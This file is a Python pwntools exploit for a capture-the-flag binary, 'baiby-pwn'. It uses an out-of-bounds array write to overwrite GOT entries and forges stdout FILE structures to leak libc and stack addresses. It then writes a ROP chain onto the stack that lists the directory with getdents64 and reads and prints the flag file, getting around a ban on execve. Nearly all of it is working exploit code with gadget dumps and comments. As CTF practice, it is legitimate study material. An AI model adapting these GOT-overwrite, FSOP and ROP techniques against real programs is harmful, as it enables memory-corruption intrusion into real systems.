#!/usr/bin/env python3

from pwn import *
import struct

e = ELF("./baiby-pwn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e

# context.terminal =  ['tmux', 'new-window', '-n', 'GDB']
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]
context.terminal = ["tmux", "splitw", "-h"]


# context.log_level = "debug"
DOCKER_PORT		= 5000
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
b *main+190 
c
printf "RSP:%p\\n", $rsp
"""

if args.GDB:
    r = process(e.path, stderr=subprocess.STDOUT)
    gdb.attach(r, gdbscript=GDB_SCRIPT)
elif args.LOCAL:
	r = process(["sh", "-c", f"exec {e.path} 2>&1"])
elif args.DOCKER:
    # run container with sudo docker run --rm --privileged -p 5000:5000 pwnchall
	r = remote("localhost", DOCKER_PORT)
else:
	r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

def pack(v):
	s = "%d" % v
	assert len(s) <= 7
	return s.encode() + b"\n" * (7 - len(s))

def option_1(addr, v): # menu: array[index] = value
    idx = (addr - e.sym.arr) // 8
    sn(pack(1) + pack(idx) + pack(v))
    return

def option_2():
    sn(pack(2))
    return


""" 
from pwndbg:

Section .plt.sec 0x401080 - 0x4010d0:
0x401080: __stack_chk_fail@plt
0x401090: setbuf@plt
0x4010a0: memset@plt
0x4010b0: read@plt
0x4010c0: atol@plt
"""

"""
gadgets:

call_read:
➜  baiby-pwn objdump -d ./baiby-pwn_patched | grep "call.*4010b0"                            
  4011ea:	e8 c1 fe ff ff       	call   4010b0 <read@plt>

➜  baiby-pwn objdump -d ./baiby-pwn_patched | grep -b5 "call.*4010b0"
# ...
7056-  4011e2:	48 89 c6             	mov    %rax,%rsi
7105-  4011e5:	bf 00 00 00 00       	mov    $0x0,%edi
7154:  4011ea:	e8 c1 fe ff ff       	call   4010b0 <read@plt>



load_stdout:
objdump -d ./baiby-pwn_patched | grep -b5 "call.*401090"

# load stdin
7811-  401216:	48 89 e5             	mov    %rsp,%rbp
7860-  401219:	48 83 ec 10          	sub    $0x10,%rsp
7910-  40121d:	48 8b 05 2c 2e 00 00 	mov    0x2e2c(%rip),%rax        # 404050 <stdin@GLIBC_2.2.5>
8003-  401224:	be 00 00 00 00       	mov    $0x0,%esi
8052-  401229:	48 89 c7             	mov    %rax,%rdi 
8101:  40122c:	e8 5f fe ff ff       	call   401090 <setbuf@plt>

# load stdout
8160-  401231:	48 8b 05 08 2e 00 00 	mov    0x2e08(%rip),%rax        # 404040 <stdout@GLIBC_2.2.5>
8254-  401238:	be 00 00 00 00       	mov    $0x0,%esi
8303-  40123d:	48 89 c7             	mov    %rax,%rdi
8352:  401240:	e8 4b fe ff ff       	call   401090 <setbuf@plt>

# load stderr  
8411-  401245:	48 8b 05 14 2e 00 00 	mov    0x2e14(%rip),%rax        # 404060 <stderr@GLIBC_2.2.5>
8505-  40124c:	be 00 00 00 00       	mov    $0x0,%esi
8554-  401251:	48 89 c7             	mov    %rax,%rdi
8603:  401254:	e8 37 fe ff ff       	call   401090 <setbuf@plt>
"""

call_read = 0x4011e2 # mov rsi, rax; mov edi, 0; call read@plt
load_stdout = 0x401231 # mov rax, [stdout]; mov esi, 0; mov rdi, rax; rdi = &_IO_2_1_stdout_; call setbuf@plt
load_stdin = 0x40121d

stdout_ptr = 0x404040
stdin_ptr = stdout_ptr + 0x10 
stderr_ptr = stdin_ptr + 0x10


"""
idea: make stdout think its buffer output is in the got -> when libc empties its buffers it prints the got addresses -> libc leak 

setbuf = changes a stream's buffer:
    - setbuf(stdout, null) -> stdout is in unbuffered mode
    - setbuf(stdout, ptr) -> uses ptr as the buffer instead of the default one

internally it does setbuf(stdout, 0) -> _IO_setbuf -> _IO_file_setbuf -> _IO_default_setbuf -> _IO_SYNC -> _IO_do_flush -> _IO_OVERFLOW / _IO_do_write

_IO_SYNC empties the old buffer before changing it. to empty it , checks _IO_write_base and _IO_write_ptr from the stdout file structure :) so if i corrupt them i can print whatever i want

how to leak:
- overwrite (in the got) memset with a gadget to load stdout, and setbuf with a gadget to call read
- choose option 2 which becomes read from stdout (input request)
- send the fake file structure which will be written into stdout 
- set setbuf to its original value on the got

now:
option_2 -> got.memset -> gadget to load stdout -> setbuf(stdout, NULL) -> setbuf empties setbuf buffer -> prints data from the got
"""


def leak():
    # overwrite the got.stack_check_fail function to main + 72 -> return of the main loop so the program won't crash if the canary is fucked up
    option_1(e.got.__stack_chk_fail, e.sym.main+72)

    option_1(e.got.memset, load_stdout) # memset -> loads stdout , calls setbuf
    option_1(e.got.setbuf, call_read) # setbuf -> read(0, rax, rdx)
    
    option_2() # expects input (overwrite file structure -> leak)
    # r.interactive()

    """ 
    got: 
    GOT protection: Partial RELRO | Found 5 GOT entries passing the filter
    [0x404000] __stack_chk_fail@GLIBC_2.4 -> 0x401030 ◂— endbr64
    [0x404008] setbuf@GLIBC_2.2.5 -> 0x7ffff7c9ed90 (setbuf) ◂— endbr64
    [0x404010] memset@GLIBC_2.2.5 -> 0x401050 ◂— endbr64
    [0x404018] read@GLIBC_2.2.5 -> 0x7ffff7d3e970 (read) ◂— endbr64
    [0x404020] atol@GLIBC_2.2.5 -> 0x401070 ◂— endbr64
    
    after the got there are stdout, stderr and stdin, we need to leak also those addresses (i could have just done libc base + offset but nevermind):
    x/100x 0x404000
    0x404000 <__stack_chk_fail@got.plt>:	0x00401030	0x00000000	0xf7c9ed90	0x00007fff
    0x404010 <memset@got.plt>:	0x00401050	0x00000000	0xf7d3e970	0x00007fff
    0x404020 <atol@got.plt>:	0x00401070	0x00000000	0x00000000	0x00000000
    0x404030:	0x00000000	0x00000000	0x00000000	0x00000000
    0x404040 <stdout@GLIBC_2.2.5>:	0xf7e51580	0x00007fff	0x00000000	0x00000000
    0x404050 <stdin@GLIBC_2.2.5>:	0xf7e508e0	0x00007fff	0x00000000	0x00000000
    0x404060 <stderr@GLIBC_2.2.5>:	0xf7e514a0	0x00007fff	0x00000000	0x00000000
    0x404070:	0x00000000	0x00000000	0x00000000	0x00000000

    """
    fs = FileStructure()
    fs.flags = 0xFBAD1800 # flags with IO_CURRENTLY_PUTTING and IO_IS_APPENDING = 1 
    fs._IO_write_base = 0x404000
    fs._IO_write_ptr = 0x404068
    fs._IO_write_end = 0x404068
    
    # by default pwntools sets _IO_read_end = 0 -> in this case _IO_write_base - _IO_read_end > 0 -> ok! no blocking errors on the socket


    payload = bytes(fs)[:0x40] # payload size = 0x40 because memset has the size = sizeof(arr) = 0x40
    sn(payload) # send payload to the read i triggered 

    # restore got.setbuf to its previos valid value, otherrwise program will crash and not flush correctly
    option_1(e.got.setbuf, 0x401040)
    
    option_2() # call memset
    leaked = r.recvn(0x68) # i have the leak!!
    
    atol = u64(leaked[0x20:0x28])
    aleak('atol', atol)
    libc.address = atol - 0x46680
    aleak('libc', libc.address)
    
    stdout = u64(leaked[0x40:0x48])
    stderr = u64(leaked[0x60:0x68])

    aleak('stdout', stdout)
    aleak('stderr', stderr)
    # r.interactive()

    return



# arb write

""" 
i need to write a rop chain on the stack
problem: i can write an idx <= 99999 -> can't reach libc/stack 
idea: overwrite got entries so that read is called and i can write a payload where i want

got.memset = load stdin, got.setbuf = target 
so: option_2 -> memset -> load stdin -> calls setbuf -> read! (write rop chain to target)

target is a stack address so I need to leak it from libc.environ

"""


def leak_stack():
    pause()
    print("leaking stack") 
    
    option_1(e.got.memset, load_stdout) # memset -> loads stdout , calls setbuf
    option_1(e.got.setbuf, call_read) # setbuf -> read(0, rax, rdx)
    option_2() # trigger read
    # r.interactive()
    
    fs = FileStructure()
    fs.flags = 0xFBAD0800 # flags with IO_CURRENTLY_PUTTING = 1 and IO_IS_APPENDING = 0 (to avoid seek being called and crashing since we are communicating with pipes) 

    # by default pwntools sets _IO_read_end = 0 -> but libc.environ is a huge negative value -> lseek crashes with critical error
    # fix: set write base == read end to avoid output corruption
    fs._IO_write_base = libc.sym.environ
    fs._IO_read_end = libc.sym.environ 
    fs._IO_write_ptr = libc.sym.environ + 0x8
    fs._IO_write_end = libc.sym.environ + 0x8
    payload = bytes(fs)[:0x40]

    sn(payload)
    print(hex(libc.sym.setbuf))
    option_1(e.got.setbuf, 0x401040)
    option_2()

    # r.interactive()
    stack = u64(r.recvn(0x8))
    aleak('stack leak', stack)
    


     # use the arb read to dump stack addresses and find rip (where we will write the rop chain)
    window_size = 0x1000
    window_low = stack - window_size
    option_1(e.got.memset, load_stdout)
    option_1(e.got.setbuf, call_read)
    option_2()

    fs = FileStructure()
    fs.flags = 0xFBAD1800
    fs._IO_write_base = window_low
    fs._IO_write_ptr = window_low + window_size
    fs._IO_write_end = window_low + window_size
    fs._IO_read_end = 0
    sn(bytes(fs)[:0x40])

    option_1(e.got.setbuf, 0x401040) # restore setbuf to its correct value
    option_2()

    data = r.recvn(window_size)
    target = libc.address + 0x2A1CA # search addresses around libc_start_main
    
    for off in range(0, len(data) - 8, 8):
        v = u64(data[off:off+8])
        if target - 0x100 <= v < target + 0x100:
            ret_slot = window_low + off
            aleak('stack target', ret_slot)
            return ret_slot

    raise Exception("rip not found")

  


def solve(stack):

    # write current directory path in arr (.bss)
    cur_dir = u64(b".\0\0\0\0\0\0\0") if args.LOCAL or args.GDB else u64(b"/\0\0\0\0\0\0\0")

    option_1(e.sym.arr, cur_dir)                        
    
    # i can write a rop chain into stack
    # file name is flag{random}.txt 
    # do getdens on current directory -> list files -> read to get the filename from the input -> open, read, write of the file
    
    pop_rdi = libc.address +  0x10f78b
    pop_rsi = libc.address + 0x110a7d
    pop_rbx = libc.address + 0x586e4
    rop = ROP(libc)
    rop.open(e.sym.arr, 0) # open directory
    
    # list directory files with getdents64

    # avoid 0x0x404040 - 0x404070 where stdin/out/err ptrs are stored
    list_buf = 0x404300
    name_buf = 0x404300 + 0x400

    # no directs gadget in libc to set rdx (such a pain)
    set_rdx = libc.address + 0xb0153 # mov rdx, rbx; pop rbx; pop r12; pop rbp; ret;
    # rop.rbx = 0x400
    rop.raw(pop_rbx)
    rop.raw(0x400)

    rop.raw(set_rdx)
    rop.raw(0x0) # filler for rbx
    rop.raw(0x0) # filler r12 
    rop.raw(0x0) # filler rbp

    rop.raw(pop_rdi)
    rop.raw(3)
    # rop.rsi = e.sym.arr
    rop.raw(pop_rsi)
    rop.raw(list_buf)

    rop.raw(libc.sym.getdents64) # getdents64(3, arr (= current directory), 0x400)
    
    # print files list
    rop.raw(pop_rbx)
    rop.raw(0x400)
    rop.raw(set_rdx)
    rop.raw(0x0)
    rop.raw(0x0)
    rop.raw(0x0)
    rop.raw(pop_rdi)
    rop.raw(1)
    rop.raw(pop_rsi)
    rop.raw(list_buf)
    rop.raw(libc.sym.write)


    # read flag file name
    # rop.rbx = 0x10
    rop.raw(pop_rbx)
    rop.raw(0x50)

    rop.raw(set_rdx)
    rop.raw(0x0) # filler for rbx
    rop.raw(0x0) # filler r12 
    rop.raw(0x0) # filler rbp
    
    rop.raw(pop_rdi)
    rop.raw(0) # read from stdin

    aleak('name buffer', name_buf)
    rop.raw(pop_rsi)
    rop.raw(name_buf)
    rop.raw(libc.sym.read) # read(0, name_buf, 0x50)
    
    # open(name_buf, 0)
    rop.raw(pop_rdi)
    rop.raw(name_buf)
    rop.raw(pop_rsi)
    rop.raw(0)
    rop.raw(libc.sym.open)
    
   
    # read flag file content
    log.info('read2')
    rop.raw(pop_rbx)
    rop.raw(0x100)

    rop.raw(set_rdx)
    rop.raw(0x0) # filler for rbx
    rop.raw(0x0) # filler r12 
    rop.raw(0x0) # filler rbp
    rop.raw(pop_rdi)
    rop.raw(4) # fd

    rop.raw(pop_rsi)
    rop.raw(name_buf)
    rop.raw(libc.sym.read) # read(3, addr, 0x100)


    # print flag
    # rop.rbx = 0x100
    rop.raw(pop_rbx)
    rop.raw(0x100)

    rop.raw(set_rdx)
    rop.raw(0x0) # filler for rbx
    rop.raw(0x0) # filler r12 
    rop.raw(0x0) # filler rbp
    rop.raw(pop_rdi)
    rop.raw(1)

    rop.raw(pop_rsi)
    rop.raw(name_buf)
    rop.raw(libc.sym.write) # write(1, addr, 0x100)
 

    payload = rop.chain()
    # print(rop.dump())

    # i can't write > 0x40 bytes at a time (arr has size 0x40)
    for i in range(0, len(payload), 0x40):
        block = payload[i:i+0x40]
        write_rop(stack + i, block)

    return 


def write_rop(stack, block):
    # i can't write stack address in memory with option_1 :( they are too long

    """
    in bss there is:
    0x404040: stdout_ptr
    0x404050: stdin_ptr
    0x404060: stderr_ptr
    """

    # so i use my arb write to write the stack addr into stdinptr @ 0x404050
    
    # write a stack address by self referencing stdout and writing directly there (it will be the 'buffer' argument of the read)
    option_1(stdout_ptr, stdout_ptr) # *stdout_ptr = stdout_ptr
    option_1(e.got.memset,load_stdout) # rax = *stdout_ptr = stdout_ptr
    option_1(e.got.setbuf, call_read)
    option_2()
                                                            

    set_stack = flat({
        0x00: libc.sym.stdout,
        0x10: stack, # overwrite stdin_ptr
        0x20: libc.sym.stderr
    })
    r.send(set_stack.ljust(0x40, b"\x00"))
     # now the next read will read from stdin -> stack

    option_1(e.got.memset, load_stdin) # rax = *stdin_ptr = stack
    option_1(e.got.setbuf, call_read)
    option_2()
    sn(block.ljust(0x40, b'\x00'))



def main():

    leak()
    stack_target = leak_stack()
    solve(stack_target)
    sn(pack(9))

    if args.GDB:
        log.info("if in gdb: cmd continue.\npress enter:")
        input()

    
    listing = r.recvrepeat(timeout=5)
    log.info("folder content bytes:")
    print(repr(listing)) # print folder content bytes
    pause()
    match = re.search(rb"(flag[-\w.]*\.txt)", listing)
    if not match:
        log.failure("flag file not found")
        exit(1)

    flag_name = match.group(1)
    path = flag_name if args.LOCAL or args.GDB else b"/" + flag_name
    log.success(f"found: {path.decode()}")

    sn(path.ljust(0x50, b"\x00"))
    r.interactive()

if __name__ == "__main__":
	main()


""" 
no pie, partial relro, nx, canary, ibt and shstk enabled, can't do execve because of landlock in launcher

option 1:
arr[index] = value writes 8 bytes at arr + index * 8
arr @ 0x404080

option 2: 
calls memset from the got. 

checksec:
partial relro -> .got.plt is writable, can't be non-writable because of linker's lazy binding = fuctions are resolved at the first call, with full relro they are resolved at the program start and then the got is made read only
-> i can overwrite got entries

"""
